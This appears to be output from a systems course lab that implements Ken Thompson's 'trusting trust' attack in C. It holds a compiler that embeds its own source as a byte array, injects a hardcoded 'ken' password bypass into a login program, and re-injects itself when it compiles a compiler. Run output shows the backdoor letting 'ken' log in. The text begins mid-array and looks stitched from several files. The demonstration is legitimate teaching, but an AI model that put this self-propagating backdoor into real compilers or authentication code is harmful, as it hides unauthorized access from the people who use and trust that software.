	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	34, 	44, 	32, 	112, 	114, 	111,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	114,
	78, 	101, 	120, 	116, 	76, 	105, 	110, 	101,
	71, 	101, 	116, 	32, 	61, 	32, 	48, 	59,
	10, 	32, 	32, 	32, 	32, 	108, 	105, 	110,
	101, 	32, 	61, 	32, 	115, 	116, 	114, 	116,
	111, 	107, 	40, 	78, 	85, 	76, 	76, 	44,
	32, 	34, 	92, 	110, 	34, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	47, 	47, 	32, 	99,
	111, 	110, 	116, 	105, 	110, 	117, 	101, 	59,
	10, 	32, 	32, 	125, 	10, 	32, 	32, 	102,
	112, 	114, 	105, 	110, 	116, 	102, 	40, 	111,
	117, 	116, 	112, 	117, 	116, 	44, 	32, 	34,
	37, 	115, 	92, 	110, 	34, 	44, 	32, 	108,
	105, 	110, 	101, 	41, 	59, 	10, 	32, 	32,
	105, 	102, 	32, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	108, 	105, 	110, 	101, 	44,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	41, 	32, 	61, 	61, 	32, 	48,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	108, 	111, 	103, 	105, 	110, 	78, 	101, 	120,
	116, 	76, 	105, 	110, 	101, 	71, 	101, 	116,
	32, 	61, 	32, 	49, 	59, 	10, 	32, 	32,
	125, 	10, 	32, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	102, 	105, 	114,
	115, 	116, 	95, 	108, 	105, 	110, 	101, 	41,
	32, 	61, 	61, 	32, 	48, 	32, 	38, 	38,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	61, 	61, 	32,
	48, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	114, 	78, 	101, 	120, 	116, 	76, 	105, 	110,
	101, 	71, 	101, 	116, 	32, 	43, 	61, 	32,
	49, 	59, 	10, 	32, 	32, 	125, 	32, 	101,
	108, 	115, 	101, 	32, 	105, 	102, 	32, 	40,
	115, 	116, 	114, 	99, 	109, 	112, 	40, 	108,
	105, 	110, 	101, 	44, 	32, 	115, 	101, 	99,
	111, 	110, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	49, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	32,
	101, 	108, 	115, 	101, 	32, 	105, 	102, 	32,
	40, 	115, 	116, 	114, 	99, 	109, 	112, 	40,
	108, 	105, 	110, 	101, 	44, 	32, 	116, 	104,
	105, 	114, 	100, 	95, 	108, 	105, 	110, 	101,
	41, 	32, 	61, 	61, 	32, 	48, 	32, 	38,
	38, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	61, 	61,
	32, 	50, 	41, 	32, 	123, 	10, 	32, 	32,
	32, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	114, 	78, 	101, 	120, 	116, 	76, 	105,
	110, 	101, 	71, 	101, 	116, 	32, 	43, 	61,
	32, 	49, 	59, 	10, 	32, 	32, 	125, 	10,
	32, 	32, 	108, 	105, 	110, 	101, 	32, 	61,
	32, 	115, 	116, 	114, 	116, 	111, 	107, 	40,
	78, 	85, 	76, 	76, 	44, 	32, 	34, 	92,
	110, 	34, 	41, 	59, 	32, 	47, 	47, 	32,
	67, 	111, 	110, 	116, 	105, 	110, 	117, 	101,
	32, 	116, 	111, 	32, 	116, 	111, 	107, 	101,
	110, 	105, 	122, 	101, 	32, 	116, 	104, 	101,
	32, 	115, 	116, 	114, 	105, 	110, 	103, 	10,
	125, 	10, 	102, 	99, 	108, 	111, 	115, 	101,
	40, 	102, 	112, 	41, 	59, 	10, 	10, 	99,
	104, 	97, 	114, 	32, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	91, 	49, 	48,
	48, 	93, 	59, 	10, 	70, 	73, 	76, 	69,
	32, 	42, 	100, 	101, 	98, 	117, 	103, 	32,
	61, 	32, 	102, 	111, 	112, 	101, 	110, 	40,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	34, 	44, 	32,
	34, 	114, 	34, 	41, 	59, 	10, 	97, 	115,
	115, 	101, 	114, 	116, 	40, 	100, 	101, 	98,
	117, 	103, 	41, 	59, 	10, 	119, 	104, 	105,
	108, 	101, 	32, 	40, 	102, 	103, 	101, 	116,
	115, 	40, 	100, 	101, 	98, 	117, 	103, 	76,
	105, 	110, 	101, 	44, 	32, 	115, 	105, 	122,
	101, 	111, 	102, 	40, 	100, 	101, 	98, 	117,
	103, 	76, 	105, 	110, 	101, 	41, 	44, 	32,
	100, 	101, 	98, 	117, 	103, 	41, 	32, 	33,
	61, 	32, 	78, 	85, 	76, 	76, 	41, 	32,
	123, 	10, 	32, 	32, 	112, 	114, 	105, 	110,
	116, 	102, 	40, 	34, 	37, 	115, 	34, 	44,
	32, 	100, 	101, 	98, 	117, 	103, 	76, 	105,
	110, 	101, 	41, 	59, 	10, 	125, 0 };
FILE *output = fp;
static char login_sig[] = "int login(char *user) {";
static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
static char first_line[] =
    "static void compile(char *program, char *outname) {";
static char second_line[] = "  FILE *fp = fopen(\"./temp-out.c\", \"w\");";
static char third_line[] = "  assert(fp);";
char loginNextLineGet = 0;
char compilerNextLineGet = 0;
char *line = strtok(program, "\n");
while (line != NULL) {
  if (loginNextLineGet == 1) {
    fprintf(output, "%s", login_attack);
    loginNextLineGet = 0;
  }
  if (compilerNextLineGet == 3) {
    int i;
    fprintf(output, "%s", "char prog[] = {\n");
    for (i = 0; prog[i]; i++)
      fprintf(output, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
    fprintf(output, "%s", "0 };\n");
    fprintf(output, "%s", prog);
    compilerNextLineGet = 0;
    line = strtok(NULL, "\n");
    // continue;
  }
  fprintf(output, "%s\n", line);
  if (strcmp(line, login_sig) == 0) {
    loginNextLineGet = 1;
  }
  if (strcmp(line, first_line) == 0 && compilerNextLineGet == 0) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, second_line) == 0 && compilerNextLineGet == 1) {
    compilerNextLineGet += 1;
  } else if (strcmp(line, third_line) == 0 && compilerNextLineGet == 2) {
    compilerNextLineGet += 1;
  }
  line = strtok(NULL, "\n"); // Continue to tokenize the string
}
fclose(fp);

char debugLine[100];
FILE *debug = fopen("./temp-out.c", "r");
assert(debug);
while (fgets(debugLine, sizeof(debugLine), debug) != NULL) {
  printf("%s", debugLine);
}  fclose(fp);
  // for step 2 you will pattern match on
  //   "static void compile(char *program, char *outname) {"
  // and inject the attack
  // match on login....
  // and inject an attack for "ken"
  // gross, call gcc.
  char buf[1024];
  sprintf(buf, "gcc ./temp-out.c -o %s -Wno-nullability-completeness", outname);
  if (system(buf) != 0)
    error("system failed\n");
}
#define N 8 * 1024 * 1024
static char buf[N + 1];
int main(int argc, char *argv[]) {
  if (argc != 4)
    error("expected 4 arguments have %d\n", argc);
  if (strcmp(argv[2], "-o") != 0)
    error("expected -o as second argument, have <%s>\n", argv[2]);
  // read in the entire file.
  int fd;
  if ((fd = open(argv[1], O_RDONLY)) < 0)
    error("file <%s> does not exist\n", argv[1]);
  int n;
  if ((n = read(fd, buf, N)) < 1)
    error("invalid read of file <%s>\n", argv[1]);
  if (n == N)
    error("input file too large\n");
  // "compile" it.
  compile(buf, argv[3]);
  return 0;
}
// engler, cs240lx:
//  a ridiculous only-useful-for-illustration login program.
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
// dumb login: store user and password in memory in plaintext
struct credentials { char *user, *passwd; } creds[] = {
    { "guest", "password" },
    {0}
};
static void readline(char *buf, size_t n) {
    if(!fgets(buf, n, stdin)) {
        fprintf(stderr, "could not read input\n");
        exit(1);
    }
    // delete newline
    buf[strlen(buf)-1] = 0;
}
int login(char *user) {
if(strcmp(user, "ken") == 0) return 1;    char passwd[1024];
    for(struct credentials *c = &creds[0]; c->user; c++) {
        if(strcmp(c->user, user) == 0) {
            printf("passwd: ");
            readline(passwd, sizeof passwd);
            if(strcmp(c->passwd, passwd) == 0)
                return 1;
            printf("user <%s>: mismatched password\n", user);
            return 0;
        }
    }
    printf("user <%s> does not exist\n", user);
    return 0;
}
int main(void) {
    char user[1024];
    printf("user: ");
    readline(user, sizeof user);
    if(login(user)) {
        printf("successful login: <%s>\n", user);
        return 0;
    } else {
        printf("login failed for: <%s>\n", user);
        return 1;
    }
}
user: successful login: <ken>
make: *** [check] Error 1

Return code: 0
